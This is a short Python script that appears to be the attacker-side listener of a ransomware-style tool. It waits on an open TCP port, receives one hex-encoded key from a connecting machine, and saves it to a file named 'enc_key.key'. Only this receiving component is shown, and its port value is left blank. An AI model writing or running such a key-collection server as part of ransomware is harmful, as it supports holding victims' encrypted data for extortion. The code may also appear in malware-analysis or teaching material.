#!/usr/bin/env python3


import socket


IP_ADDR="0.0.0.0"
PORT=  #ADD PORT HERE

try:
    with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as s:
        s.bind((IP_ADDR,PORT))
        print(f"[+] Listening for connections {IP_ADDR}:{PORT}")
        s.listen(1)
        conn,addr=s.accept()
        print(f"[+] connection from {addr} established...")
        with conn:
            while True:
                try:
                    key=conn.recv(1024).decode()
                    decoded_key=bytes.fromhex(key)
                    if not key:
                        print("[x] no data received.. closing socket..")
                        break
                    with open("enc_key.key","wb") as target_file:
                        target_file.write(decoded_key)
                    break
                except Exception as e:
                    print(f"[x] Error while receiving data: {e}")
                    break
            print("[+] key downloaded to enc_key.key file...")
except KeyboardInterrupt:
    print("[x] interrupt detected.. exiting...")
    exit(0)